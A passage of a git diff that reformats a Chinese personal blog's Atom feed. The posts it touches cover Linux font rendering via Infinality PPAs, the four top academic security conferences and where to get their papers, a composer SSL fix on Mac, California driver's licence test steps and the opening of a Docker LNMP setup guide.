+<li><a href="http://www.webupd8.org/2013/06/better-font-rendering-in-linux-with.html">BETTER FONT RENDERING IN LINUX WITH INFINALITY</a></li>
+<li><a href="http://www.v2ex.com/t/88662">Linux中PyCharm渲染字体</a></li>
 </ol>
 
 
-<h3 id="toc_2">安装步骤</h3>
-
+<h3>安装步骤</h3>
 
 <p>需要安装两个软件包进行设置，具体操作如下</p>
 
 <ol>
-    <li>安装Infinality
-<pre><code>sudo add-apt-repository ppa:no1wantdthisname/ppa
-sudo apt-get update
-sudo apt-get upgrade
-sudo apt-get install fontconfig-infinality
-</code></pre>
-</li>
-    <li>安装openjdk-fontfix
-<pre><code>sudo add-apt-repository ppa:no1wantdthisname/openjdk-fontfix
-sudo apt-get update
-sudo apt-get upgrade
-</code></pre>
-</li>
-    <li>安装完成</li>
+<li><p>安装Infinality</p>
+
+<pre><code> sudo add-apt-repository ppa:no1wantdthisname/ppa
+ sudo apt-get update
+ sudo apt-get upgrade
+ sudo apt-get install fontconfig-infinality
+</code></pre></li>
+<li><p>安装openjdk-fontfix</p>
+
+<pre><code> sudo add-apt-repository ppa:no1wantdthisname/openjdk-fontfix
+ sudo apt-get update
+ sudo apt-get upgrade
+</code></pre></li>
+<li>安装完成</li>
 </ol>
 
 ]]></content>
@@ -577,37 +534,54 @@ sudo apt-get upgrade
   
   <entry>
     <title type="html"><![CDATA[安全界的顶级会议]]></title>
-    <link href="http://test.ourren.com/2015/01/20/%E5%AE%89%E5%85%A8%E7%95%8C%E7%9A%84%E9%A1%B6%E7%BA%A7%E4%BC%9A%E8%AE%AE/"/>
+    <link href="http://test.ourren.com/2015/01/20/top%20security%20conference/"/>
     <updated>2015-01-20T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/20/安全界的顶级会议</id>
+    <id>http://test.ourren.com/2015/01/20/top security conference</id>
     <content type="html"><![CDATA[<p>可能很多人(特别是国内的，咳咳)跟我一样读了很多年书，虽然从事的是安全领域的研究，但是国际上顶级的安全会议可能都不知道，我也是最近才研究了一下国际上的安全顶级会议和论文下载方法。</p>
 
-<h4 id="toc_0">四大顶会</h4>
-
+<h4>四大顶会</h4>
 
 <p>安全界有四大著名顶级会议，简称：S&amp;P、CCS、Security、NDSS；其实有两个网页对安全类会议进行了排名，详细排名大家可以参考「1、2」。但是貌似从事安全研究的人员只认这四个会议，导致这四个会议论文的通过率非常低，因此我们只要关注这四个会议的文章就大概知道国际上安全人员在研究些啥东西了；</p>
 
+<!--more-->
+
+
 <ol>
-    <li>S&P从<a href="http://www.ieee-security.org/TC/SP-Index.html">S&P</a>的官方上看，你会发现其实S&P每年不只一个会议，S&P又分为两类：SP Conference Information、SP Workshops Information。第一类「SPC」大家一看英文应该就知道含义吧，第二类可以看2014年<a href="http://www.ieee-security.org/TC/SPW2014/index.html">官网</a>的一个介绍：
-<blockquote>Overview: Since 1980, the IEEE Symposium on Security and Privacy (SP) has been the premier forum for the presentation of developments in computer security and electronic privacy, and for bringing together researchers and practitioners in the field.
+<li><p>S&amp;P</p>
 
-In order to further expand the opportunities for scientific exchanges, we created a new venue within the IEEE CS Technical Committee on Security and Privacy called Security and Privacy Workshops (SPW). The typical purpose of such a workshop is to cover a specific aspect of security and privacy in more detail, making it easy for the participants to attend IEEE SP and a specialized workshop at IEEE SPW with just one trip. Furthermore, the co-location offers synergies for the organizers. The workshops are co-located with the IEEE Security and Privacy Symposium, and the number of workshops and attendees have grown steadily during recent years. Workshops can be annual events (e.g. W2SP), one time events, or aperiodic.</blockquote>
-说了这么多的意思就是「SPW」是为了增加投论文的机会，毕竟「SP」每年也收录不到太多的论文，并且这个「SPW」所囊括的会议也越来越多，就2014年貌似有就有<a href="http://www.ieee-security.org/TC/SPW2014/index.html">7个会议</a>；
+<p> 从<a href="http://www.ieee-security.org/TC/SP-Index.html">S&amp;P</a>的官方上看，你会发现其实S&amp;P每年不只一个会议，S&amp;P又分为两类：SP Conference Information、SP Workshops Information。第一类「SPC」大家一看英文应该就知道含义吧，第二类可以看2014年<a href="http://www.ieee-security.org/TC/SPW2014/index.html">官网</a>的一个介绍：</p>
 
-这个会议的演讲论文在<a href="http://www.ieee-security.org/TC/SP-Index.html">主页</a>以及每个会议的<a href="http://www.ieee-security.org/TC/SPW2014/index.html">首页</a>(需要点击进入每个会议网页哈)都有下载，另外你要是你拥有IEEE论文数据库，可以通过<a href="http://ieeexplore.ieee.org/xpl/conferences.jsp">IEEE的会议搜索</a>进行会议搜索，比如：<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954656">Security and Privacy (SP), 2014 IEEE Symposium on</a>、<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954698">Security and Privacy Workshops (SPW), 2014 IEEE</a>。</li>
-    <li>CCS的全称为：<a href="http://www.sigsac.org/ccs.html">ACM Conference on Computer and Communications Security</a>, 看介绍也是开始于1993，还是挺久远的一个会议。会议的论文可以通过网站的链接看到<a href="http://dl.acm.org/event.cfm?id=RE182&tab=pubs&CFID=619951631&CFTOKEN=27784456">历年的论文记录</a>,当然这个论文库是在acm数据库中，你没有这个论文库的话果断Google吧，或者使用<a href="http://www.informatik.uni-trier.de/%7Eley/db/">dblp数据库</a>进行搜索，一般都可以搜到PDF，主要还是源于计算机和安全领域大家都还是乐于分享。2014年CCS的所有论文可以通过<a href="http://dl.acm.org/citation.cfm?id=2666652&CFID=619951631&CFTOKEN=27784456">Proceedings of the 2014 Workshop on Artificial Intelligent and Security Workshop</a>进行下载。</li>
-    <li>USENIX Security终于该介绍USENIX Security了，其实本人最开始接触的就是这个会议，因此这个会议的论文集居然有epub和mobi格式，不得不说科技很强大。USENIX最开始其实是UNIX，但是由于商标问题后来改为USENIX，具体过程可以参见<a href="http://zh.wikipedia.org/wiki/USENIX">维基百科USENIX</a>。USENIX 其实是一个计算机类会议的总称，详细会议列表可以看<a href="https://www.usenix.org/conferences">这里</a>，而USENIX Security只是USENIX中的安全会议，并且USENIX Security会议涵盖的安全领域也非常多，包含：二进制安全、固件安全、取证分析、Web安全、隐私保护、恶意分析等。会议的论文直接在<a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions">官网</a>提供下载，也有很多格式(PDF、EPUB、MOBI)，同时论文的<a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions">会议视频</a>也可以下载。</li>
-    <li>
-<a href="http://www.internetsociety.org/events/ndss-symposium">NDSS</a>的全称为(Network and Distributed System Security)，其官网中也提供了<a href="http://www.internetsociety.org/events/ndss-symposium/previous-conferences">历届会议列表</a>。 NDSS2014年的论文集可以通过这里进行<a href="http://pan.baidu.com/wap/link?uk=1812237392&shareid=3622732641&third=0">下载</a>或者<a href="http://www.internetsociety.org/ndss2014/programme">官方</a>。</li>
+<blockquote><p>Overview:
+Since 1980, the IEEE Symposium on Security and Privacy (SP) has been the premier forum for the presentation of developments in computer security and electronic privacy, and for bringing together researchers and practitioners in the field.</p>
+
+<p>In order to further expand the opportunities for scientific exchanges, we created a new venue within the IEEE CS Technical Committee on Security and Privacy called Security and Privacy Workshops (SPW). The typical purpose of such a workshop is to cover a specific aspect of security and privacy in more detail, making it easy for the participants to attend IEEE SP and a specialized workshop at IEEE SPW with just one trip. Furthermore, the co-location offers synergies for the organizers. The workshops are co-located with the IEEE Security and Privacy Symposium, and the number of workshops and attendees have grown steadily during recent years. Workshops can be annual events (e.g. W2SP), one time events, or aperiodic.</p></blockquote>
+
+<p>  说了这么多的意思就是「SPW」是为了增加投论文的机会，毕竟「SP」每年也收录不到太多的论文，并且这个「SPW」所囊括的会议也越来越多，就2014年貌似有就有<a href="http://www.ieee-security.org/TC/SPW2014/index.html">7个会议</a>；</p>
+
+<p>  这个会议的演讲论文在<a href="http://www.ieee-security.org/TC/SP-Index.html">主页</a>以及每个会议的<a href="http://www.ieee-security.org/TC/SPW2014/index.html">首页</a>(需要点击进入每个会议网页哈)都有下载，另外你要是你拥有IEEE论文数据库，可以通过<a href="http://ieeexplore.ieee.org/xpl/conferences.jsp">IEEE的会议搜索</a>进行会议搜索，比如：<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954656">Security and Privacy (SP), 2014 IEEE Symposium on</a>、<a href="http://ieeexplore.ieee.org/xpl/mostRecentIssue.jsp?punumber=6954698">Security and Privacy Workshops (SPW), 2014 IEEE</a>。</p></li>
+<li><p>CCS</p>
+
+<p> CCS的全称为：<a href="http://www.sigsac.org/ccs.html">ACM Conference on Computer and Communications Security</a>, 看介绍也是开始于1993，还是挺久远的一个会议。</p>
+
+<p> 会议的论文可以通过网站的链接看到<a href="http://dl.acm.org/event.cfm?id=RE182&amp;tab=pubs&amp;CFID=619951631&amp;CFTOKEN=27784456">历年的论文记录</a>,当然这个论文库是在acm数据库中，你没有这个论文库的话果断Google吧，或者使用<a href="http://www.informatik.uni-trier.de/~ley/db/">dblp数据库</a>进行搜索，一般都可以搜到PDF，主要还是源于计算机和安全领域大家都还是乐于分享。2014年CCS的所有论文可以通过<a href="http://dl.acm.org/citation.cfm?id=2666652&amp;CFID=619951631&amp;CFTOKEN=27784456">Proceedings of the 2014 Workshop on Artificial Intelligent and Security Workshop</a>进行下载。</p></li>
+<li><p>USENIX Security</p>
+
+<p> 终于该介绍USENIX Security了，其实本人最开始接触的就是这个会议，因此这个会议的论文集居然有epub和mobi格式，不得不说科技很强大。USENIX最开始其实是UNIX，但是由于商标问题后来改为USENIX，具体过程可以参见<a href="http://zh.wikipedia.org/wiki/USENIX">维基百科USENIX</a>。USENIX 其实是一个计算机类会议的总称，详细会议列表可以看<a href="https://www.usenix.org/conferences">这里</a>，而USENIX Security只是USENIX中的安全会议，并且USENIX Security会议涵盖的安全领域也非常多，包含：二进制安全、固件安全、取证分析、Web安全、隐私保护、恶意分析等。</p>
+
+<p> 会议的论文直接在<a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions">官网</a>提供下载，也有很多格式(PDF、EPUB、MOBI)。</p></li>
+<li><p>NDSS</p>
+
+<p> <a href="http://www.internetsociety.org/events/ndss-symposium">NDSS</a>的全称为(Network and Distributed System Security)，其官网中也提供了<a href="http://www.internetsociety.org/events/ndss-symposium/previous-conferences">历届会议列表</a>。
+ NDSS2014年的论文集可以通过这里进行<a href="http://pan.baidu.com/wap/link?uk=1812237392&amp;shareid=3622732641&amp;third=0">下载</a>。</p></li>
 </ol>
 
 
-<h4 id="toc_1">参考链接</h4>
-
+<h4>参考链接</h4>
 
 <ol>
-    <li><a href="http://faculty.cs.tamu.edu/guofei/sec_conf_stat.htm">Computer Security Conference Ranking and Statistic</a></li>
-    <li><a href="http://icsd.i2r.a-star.edu.sg/staff/jianying/conference-ranking.html">Top Crypto and Security Conferences Ranking (2014)</a></li>
+<li><a href="http://faculty.cs.tamu.edu/guofei/sec_conf_stat.htm">Computer Security Conference Ranking and Statistic</a></li>
+<li><a href="http://icsd.i2r.a-star.edu.sg/staff/jianying/conference-ranking.html">Top Crypto and Security Conferences Ranking (2014)</a></li>
+<li></li>
 </ol>
 
 ]]></content>
@@ -615,9 +589,9 @@ In order to further expand the opportunities for scientific exchanges, we create
   
   <entry>
     <title type="html"><![CDATA[解决composer的ssl证书问题]]></title>
-    <link href="http://test.ourren.com/2015/01/18/%E8%A7%A3%E5%86%B3composer%E7%9A%84ssl%E8%AF%81%E4%B9%A6%E9%97%AE%E9%A2%98/"/>
+    <link href="http://test.ourren.com/2015/01/18/solve%20composer%20ssl%20error/"/>
     <updated>2015-01-18T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/18/解决composer的ssl证书问题</id>
+    <id>http://test.ourren.com/2015/01/18/solve composer ssl error</id>
     <content type="html"><![CDATA[<p>作为PHP深度开发者，<a href="https://getcomposer.org/">composer</a>的出现可以说解决了大家的环境配置成本、代码共享方式和代码更新问题，现在的大部分的PHP框架如<a href="http://laravel.com/">laravel</a>、<a href="http://www.yiiframework.com/">yii2</a> 都采用composer的包管理机制，可以让开发者快速安装插件。</p>
 
 <p>最近遇到的主要问题是执行composer更新命令遇到如下错误：</p>
@@ -630,13 +604,15 @@ Failed to enable crypto
 failed to open stream: operation failed
 </code></pre>
 
+<!--more-->
 
-<p>其实你要是把这个错误信息放在网上<a href="https://www.google.com/search?q=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A&oq=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A">一搜</a>，结果发现一堆这种问题，但是问题的关键是这些问题都没有给出解决方案，比较靠谱的回答有如下几种：</p>
+
+<p>其实你要是把这个错误信息放在网上<a href="https://www.google.com/search?q=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A&amp;oq=mac+The+%22https%3A%2F%2Fpackagist.org%2Fpackages.json%22+file+could+not+be+downloaded%3A+SSL+operation+failed+with+code+1.+OpenSSL+Error+messages%3A">一搜</a>，结果发现一堆这种问题，但是问题的关键是这些问题都没有给出解决方案，比较靠谱的回答有如下几种：</p>
 
 <ol>
-    <li>证书出现问题，去更新下你的证书信息；</li>
-    <li>网络问题，自己看下是不是被欺骗了；</li>
-    <li>&#8230;&#8230;.</li>
+<li>证书出现问题，去更新下你的证书信息；</li>
+<li>网络问题，自己看下是不是被欺骗了；</li>
+<li>&hellip;&hellip;.</li>
 </ol>
 
 
@@ -645,7 +621,6 @@ failed to open stream: operation failed
 <pre><code>brew install php56
 </code></pre>
 
-
 <p>请注意，make的时候cpu飙到99%是正常的，稍微等几分钟就好了，然后执行更新：</p>
 
 <pre><code>composer update
@@ -653,12 +628,10 @@ failed to open stream: operation failed
 Your requirements could not be resolved to an installable set of packages.
 </code></pre>
 
-
 <p>这个问题就更好解决了，修改当前工程的composer.json中的：</p>
 
 <pre><code>"minimum-stability": "stable",
 </code></pre>
-
 
 <p>改为：</p>
 
@@ -666,106 +639,95 @@ Your requirements could not be resolved to an installable set of packages.
 "prefer-stable": true,
 </code></pre>
 
-
 <p>顺利解决问题～</p>
 ]]></content>
   </entry>
   
   <entry>
     <title type="html"><![CDATA[加州驾照考试全攻略]]></title>
-    <link href="http://test.ourren.com/2015/01/17/%E5%8A%A0%E5%B7%9E%E9%A9%BE%E7%85%A7%E8%80%83%E8%AF%95%E5%85%A8%E6%94%BB%E7%95%A5/"/>
+    <link href="http://test.ourren.com/2015/01/17/driver%20lisence%20in%20ca/"/>
     <updated>2015-01-17T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/17/加州驾照考试全攻略</id>
+    <id>http://test.ourren.com/2015/01/17/driver lisence in ca</id>
     <content type="html"><![CDATA[<p>相比国内科目复杂，收费昂贵的驾照考试，生活在美帝的人民可以说是幸福的，因此他们可以快速地拿到驾照。加州驾照考试主要分为两部分：笔试＋路考(1次)，收费31刀。其它州考试应该也差不多，但是加州笔试有中文试卷，这是其它州貌似没有的优势。以下是驾照学习资料和考试过程，方便需要的小伙伴。</p>
 
-<h4 id="toc_0">笔试参考资料</h4>
-
+<h4>笔试参考资料</h4>
 
 <p>其实驾照笔试考试应该国内外都差不多，仔细阅读自动车手册，并找一些真题或者模拟题来做，以下是收集到的参考资料：</p>
 
 <ol>
-    <li>
-<a href="http://apps.dmv.ca.gov/pubs/foreign_hdbk/dl600C.pdf">加州DMV中文手册</a>：此文本详细描写了驾驶员需要遵守的规则及详细讲解，可以花一个小时详细阅读下，特别提醒(加州目前的笔试加了一些新题目，因此不能仅仅参照原来的真题答案，还是仔细阅读下手册)；</li>
-    <li>
-<a href="http://www.ccyp.com/TRAFFIC/">华人工商－加州驾照模拟题</a>: 题目挺全的，基本上囊括了历年的真题和手册上的知识，但是目前有些新的题型这上面确实还没有；</li>
-    <li>
-<a href="http://www.moonbbs.com/forum.php?mod=viewthread&tid=120418&page=1">历年真题</a>: 这个帖子前面部分其实就是华人工商的题，推荐直接看上面的，后面有真题部分；</li>
+<li><a href="http://apps.dmv.ca.gov/pubs/foreign_hdbk/dl600C.pdf">加州DMV中文手册</a>：此文本详细描写了驾驶员需要遵守的规则及详细讲解，可以花一个小时详细阅读下，特别提醒(加州目前的笔试加了一些新题目，因此不能仅仅参照原来的真题答案，还是仔细阅读下手册)；</li>
+<li><a href="http://www.ccyp.com/TRAFFIC/">华人工商－加州驾照模拟题</a>: 题目挺全的，基本上囊括了历年的真题和手册上的知识，但是目前有些新的题型这上面确实还没有；</li>
+<li><a href="http://www.moonbbs.com/forum.php?mod=viewthread&amp;tid=120418&amp;page=1">历年真题</a>: 这个帖子前面部分其实就是华人工商的题，推荐直接看上面的，后面有真题部分；</li>
 </ol>
 
 
-<h4 id="toc_1">笔试携带文件</h4>
+<!--more-->
 
+
+<h4>笔试携带文件</h4>
 
 <p>复习好笔试相关知识后就需要预约笔试，有两种方法：</p>
 
 <ol>
-    <li>网站上进行预约。打开<a href="http://dmv.ca.gov">DMV OFFICIAL PAGE</a>，在ONLINE SERVICES 这个目录下找到Appointment，选择OFFICE VISIT APPOINTMENT, 选择离你最近的DMV，然后选择APPLY FOR CALIFORNIA DRIVER&#8217;S LICENSE，填写自己的个人信息 选择日期(DMV一般都十分繁忙，Appointment 一般都需要提前10-15天）。</li>
-    <li>直接奔赴DMV考场。可以不用预约，直接去DMV排队，一般排队在半个小时到一个小时；</li>
+<li>网站上进行预约。打开<a href="http://dmv.ca.gov">DMV OFFICIAL PAGE</a>，在ONLINE SERVICES 这个目录下找到Appointment，选择OFFICE VISIT APPOINTMENT, 选择离你最近的DMV，然后选择APPLY FOR CALIFORNIA DRIVER&rsquo;S LICENSE，填写自己的个人信息 选择日期(DMV一般都十分繁忙，Appointment 一般都需要提前10-15天）。</li>
+<li>直接奔赴DMV考场。可以不用预约，直接去DMV排队，一般排队在半个小时到一个小时；</li>
 </ol>
 
 
 <p>去DMV考试时需要携带一些必要资料，中国国籍满18的留学生或者访问学者你需要携带如下资料：</p>
 
 <ol>
-    <li>护照；</li>
-    <li>I-20/DS-2019;</li>
-    <li>I-94复印件，直接去<a href="https://i94.cbp.dhs.gov">dhs</a>上面打印；</li>
-    <li>中国国籍16 <your age<18 除了上面那些东西，还需要你的监护人到场;</li>
+<li>护照；</li>
+<li>I-20/DS-2019;</li>
+<li>I-94复印件，直接去<a href="https://i94.cbp.dhs.gov">dhs</a>上面打印；</li>
+<li>中国国籍16 &lt;your age&lt;18 除了上面那些东西，还需要你的监护人到场;</li>
 </ol>
 
 
-<h4 id="toc_2">笔试考试步骤</h4>
-
+<h4>笔试考试步骤</h4>
 
 <p>去DMV后有一定的操作步骤，详细描述如下：</p>
 
 <ol>
-    <li>到了柜台之后排队，工作人员会要你填写一份表格，涉及了各种基本资料, (PS 如果你在国内有驾照的话，建议带上，后面会解释为什么。）然后后面有一个问题就是：你愿不愿意捐献你自己的器官啊什么的如果你发生了任何意外&#8230;看自己选择，如果想挂了保个全尸的话，就果断选择给美帝贡献两块钱(这个选项不会对后面产生任何影响）还有提问你是否想参加选举，如果你不是美国citizen的话就不需要填写了。</li>
-    <li>写完这一个表之后，交给工作人员，她会给你一个排号，等待被叫号;</li>
-    <li>听到叫号后，前往指定柜台。在柜台处会要求测视力，建议近视不深的童鞋们先别带眼镜，不然如果戴眼镜测试的话，以后你开车都会被要求戴眼镜。然后需要录入指纹，最后在这个柜台需要交31块钱，如果你刚刚选择了给美帝国主义捐献2块钱的话，也需要在这里交（注意DMV只接受DEBIT CARD，CHECK和CASH，是不接受CREDIT的）交完钱之后，他会给你一张纸条, 注意这里他会问你是否需要中文试卷；</li>
-    <li>就要前往照相和签名了。前去排队照相，注意你照相只有一次机会，而且相片会被用在驾照上, 然后需要签名，这个签名也是用在驾照上的，一定要好好签，不同的是签名可以签多次，不满意就选择clear，重新签就好了，然后他会给你试卷。</li>
-    <li>然后就可以开始考啦，一般没有时间限制. 但是也没有必要花太多时间。请注意DMV 4.30之后就不会再给考试了 因为他们5点就下班.（PS 第一次申请驾照的人有6题的容错率，而换驾照的就只有3次了）。</li>
-    <li>做完之后拿到跟照相的同一个窗口，会有工作人员帮你改题目，如果通过了，立刻就可以拿到一张permit了，有了permit你就可以上路了，不过需要一位超过18且有正式驾照的人陪你开。PS 刚刚提到有国内驾照的童鞋，你们拿到的会是一张temporary driving license，是可以独自上路的，而不需要有人陪同，这是最大的不同~</li>
+<li>到了柜台之后排队，工作人员会要你填写一份表格，涉及了各种基本资料, (PS 如果你在国内有驾照的话，建议带上，后面会解释为什么。）然后后面有一个问题就是：你愿不愿意捐献你自己的器官啊什么的如果你发生了任何意外&hellip;看自己选择，如果想挂了保个全尸的话，就果断选择给美帝贡献两块钱(这个选项不会对后面产生任何影响）还有提问你是否想参加选举，如果你不是美国citizen的话就不需要填写了。</li>
+<li>写完这一个表之后，交给工作人员，她会给你一个排号，等待被叫号;</li>
+<li>听到叫号后，前往指定柜台。在柜台处会要求测视力，建议近视不深的童鞋们先别带眼镜，不然如果戴眼镜测试的话，以后你开车都会被要求戴眼镜。然后需要录入指纹，最后在这个柜台需要交31块钱，如果你刚刚选择了给美帝国主义捐献2块钱的话，也需要在这里交（注意DMV只接受DEBIT CARD，CHECK和CASH，是不接受CREDIT的）交完钱之后，他会给你一张纸条, 注意这里他会问你是否需要中文试卷；</li>
+<li>就要前往照相和签名了。前去排队照相，注意你照相只有一次机会，而且相片会被用在驾照上, 然后需要签名，这个签名也是用在驾照上的，一定要好好签，不同的是签名可以签多次，不满意就选择clear，重新签就好了，然后他会给你试卷。</li>
+<li>然后就可以开始考啦，一般没有时间限制. 但是也没有必要花太多时间。请注意DMV 4.30之后就不会再给考试了 因为他们5点就下班.（PS 第一次申请驾照的人有6题的容错率，而换驾照的就只有3次了）。</li>
+<li>做完之后拿到跟照相的同一个窗口，会有工作人员帮你改题目，如果通过了，立刻就可以拿到一张permit了，有了permit你就可以上路了，不过需要一位超过18且有正式驾照的人陪你开。PS 刚刚提到有国内驾照的童鞋，你们拿到的会是一张temporary driving license，是可以独自上路的，而不需要有人陪同，这是最大的不同~</li>
 </ol>
 
 
-<h4 id="toc_3">路考参考资料</h4>
-
+<h4>路考参考资料</h4>
 
 <p>一些路考参考资料汇总：</p>
 
 <ol>
-    <li>
-<a href="https://www.youtube.com/playlist?list=PL297E87DA9A1025B2">CA DMV-Top 10 Reasons for Failing the Driving Test</a>： 官方的驾驶常见错误；</li>
-    <li>
-<a href="http://www.tudou.com/programs/view/bPTcTyUDQyQ/">美国驾照路考</a>：热心小伙伴的详细讲解。</li>
-    <li>
-<a href="https://www.youtube.com/watch?v=_V5S7V5ZQLM" target="_blank">安全驾驶课程</a>。</li>
-    <li>
-<a href="https://www.youtube.com/watch?v=2kQXaC96bUU&index=2&list=FLuBaD6f8UL8es7JvFL_-T8w" target="_blank">An Actual California DMV Drive Test, Part 1 of 2</a>;</li>
-    <li><a href="https://www.youtube.com/watch?v=jyT_KdzOO6g&index=3&list=FLuBaD6f8UL8es7JvFL_-T8w" target="_blank">An Actual California DMV Drive Test, Part 2 of 2;</a></li>
+<li><a href="https://www.youtube.com/playlist?list=PL297E87DA9A1025B2">CA DMV-Top 10 Reasons for Failing the Driving Test</a>： 官方的驾驶常见错误；</li>
+<li><a href="http://www.tudou.com/programs/view/bPTcTyUDQyQ/">美国驾照路考</a>：热心小伙伴的详细讲解。</li>
+<li><a href="https://www.youtube.com/watch?v=2kQXaC96bUU&amp;index=2&amp;list=FLuBaD6f8UL8es7JvFL_-T8w">An Actual California DMV Drive Test, Part 1 of 2</a>;</li>
+<li><a href="https://www.youtube.com/watch?v=jyT_KdzOO6g&amp;index=3&amp;list=FLuBaD6f8UL8es7JvFL_-T8w">An Actual California DMV Drive Test, Part 2 of 2</a>;</li>
+<li><a href="https://www.youtube.com/watch?v=_V5S7V5ZQLM">安全驾驶课程</a>;</li>
 </ol>
 
 
-<h4 id="toc_4">路考考试步骤</h4>
-
+<h4>路考考试步骤</h4>
 
 <p>路考详细步骤如下：</p>
 
 <ol>
-    <li>首先恭喜你成功拿到permit，你已经向驾照前进了50%了~ 现在你所要做的就是搞定路考，然后静候License啦~</li>
-    <li>建议考完笔试后当场问工作人员拿一张FLYER 名字叫 how to prepare for your deiving test 是一张红色皮的小传单，里面有所有关于路考的信息。回到家后，打开电脑，再次登录<a href="http://dmv.ca.gov/">dmv</a>, 同样去到online services 然后选择appoinment，不过这次是选择behind the wheel driving test. 输入所有个人信息，就可以预约路考啦~（个人建议路考去一些人不多且附近路况好的DMV，千万不要去车多人杂市中心的DMV，考试时间能不约在上下班高峰期就别）（PS 未满18岁的童鞋需要持permit 超过6个月，完成了驾校学习并且有超过六小时的专业陪练 具体参见<a href="http://dmv.ca.gov/dl/dl_info.htm#PERMINOR">这里</a> 刚刚有朋友问，能不能笔试和路考同一天考？ 对于这个问题我只能说，看情况。 首先你必须要有permit才能申请路考，而DMV一般都挺忙的所以不能保证时间。但是万一你真的非常好运，上午通过了笔试，当天也有路试的时间available，那你就可以在同一天搞定一切问题。 所以，只是DMV的时间问题，并没有限制。</li>
-    <li>要不要去驾校？ 对于未满18岁的未成年人来说，必须要去驾校，这是规定。对于已经成年的童鞋们来说，去驾校不是必须的，如果你会开车，那么你就不必去驾校，找一台车练一练就OK啦~如果你不会开车，那么我的建议是找专业教练 google一下就有，就不多说。选择教练而不是驾校是因为时间方面更灵活也更方便，如果你喜欢驾校的严谨并且希望系统的学习，那么驾校是好的选择。</li>
-    <li>路考都考些什么？ 还记得刚刚上面提到的那张小传单吗？那个里面会有所有考试要求，当然如果你没有拿到，也不紧要，请参见下图右边的checklist 里面有所有具体的要求。与此同时，再提供北美省钱快报的详细视频 以及<a href="http://apps.dmv.ca.gov/video">DMV官方视频</a>，相信看完视频，你已经清楚考试规范和要求了。</li>
+<li>首先恭喜你成功拿到permit，你已经向驾照前进了50%了~ 现在你所要做的就是搞定路考，然后静候License啦~</li>
+<li>建议考完笔试后当场问工作人员拿一张FLYER 名字叫 how to prepare for your deiving test 是一张红色皮的小传单，里面有所有关于路考的信息。回到家后，打开电脑，再次登录<a href="http://dmv.ca.gov/">dmv</a>, 同样去到online services 然后选择appoinment，不过这次是选择behind the wheel driving test. 输入所有个人信息，就可以预约路考啦~（个人建议路考去一些人不多且附近路况好的DMV，千万不要去车多人杂市中心的DMV，考试时间能不约在上下班高峰期就别）（PS 未满18岁的童鞋需要持permit 超过6个月，完成了驾校学习并且有超过六小时的专业陪练 具体参见<a href="http://dmv.ca.gov/dl/dl_info.htm#PERMINOR">这里</a> 刚刚有朋友问，能不能笔试和路考同一天考？ 对于这个问题我只能说，看情况。 首先你必须要有permit才能申请路考，而DMV一般都挺忙的所以不能保证时间。但是万一你真的非常好运，上午通过了笔试，当天也有路试的时间available，那你就可以在同一天搞定一切问题。 所以，只是DMV的时间问题，并没有限制。</li>
+<li>要不要去驾校？ 对于未满18岁的未成年人来说，必须要去驾校，这是规定。对于已经成年的童鞋们来说，去驾校不是必须的，如果你会开车，那么你就不必去驾校，找一台车练一练就OK啦~如果你不会开车，那么我的建议是找专业教练 google一下就有，就不多说。选择教练而不是驾校是因为时间方面更灵活也更方便，如果你喜欢驾校的严谨并且希望系统的学习，那么驾校是好的选择。</li>
+<li>路考都考些什么？ 还记得刚刚上面提到的那张小传单吗？那个里面会有所有考试要求，当然如果你没有拿到，也不紧要，请参见下图右边的checklist 里面有所有具体的要求。与此同时，再提供北美省钱快报的详细视频 以及<a href="http://apps.dmv.ca.gov/video">DMV官方视频</a>，相信看完视频，你已经清楚考试规范和要求了。</li>
 </ol>
 
 
-<h4 id="toc_5">参考资料</h4>
-
+<h4>参考资料</h4>
 
 <ol>
-    <li><a href="http://www.moonbbs.com/thread-379112-1-1.html">加州驾照笔试/路考</a></li>
-    <li><a href="http://www.moonbbs.com/thread-7183-1-1.html">美国驾照路考－图文视频详解</a></li>
+<li><a href="http://www.moonbbs.com/thread-379112-1-1.html">加州驾照笔试/路考</a></li>
+<li><a href="http://www.moonbbs.com/thread-7183-1-1.html">美国驾照路考－图文视频详解</a></li>
 </ol>
 
 ]]></content>
@@ -773,113 +735,33 @@ Your requirements could not be resolved to an installable set of packages.
   
   <entry>
     <title type="html"><![CDATA[Docker搭建lnmp详解]]></title>
-    <link href="http://test.ourren.com/2015/01/09/docker%E6%90%AD%E5%BB%BAlnmp%E8%AF%A6%E8%A7%A3/"/>
+    <link href="http://test.ourren.com/2015/01/09/docker%20with%20lnmp/"/>
     <updated>2015-01-09T00:00:00-08:00</updated>
-    <id>http://test.ourren.com/2015/01/09/docker搭建lnmp详解</id>
+    <id>http://test.ourren.com/2015/01/09/docker with lnmp</id>
     <content type="html"><![CDATA[<p>docker从去年开始一直很火，但是由于其它原因也没有怎么接触，今天抽空参照<a href="https://www.docker.com/">官网</a>和<a href="http://yeasy.gitbooks.io/docker_practice/">Docker —— 从入门到实践</a>进行了初步学习，实现了利用docker下搭建lnmp环境，步骤如下：</p>
 
-<h4 id="toc_0">1.安装docker</h4>
-
-
-<p>具体步骤可以<a href="https://docs.docker.com/installation/ubuntulinux/">官方教程</a>或者<a href="http://yeasy.gitbooks.io/docker_practice/">Docker —— 从入门到实践</a>里面都有详细的介绍，本次的安装环境如下：</p>
+<h4>1.安装docker具体步骤可以<a href="https://docs.docker.com/installation/ubuntulinux/">官方教程</a>或者<a href="http://yeasy.gitbooks.io/docker_practice/">Docker —— 从入门到实践</a>里面都有详细的介绍，本次的安装环境如下：</h4>
 
 <pre><code>Ubuntu 14.04 Desktop
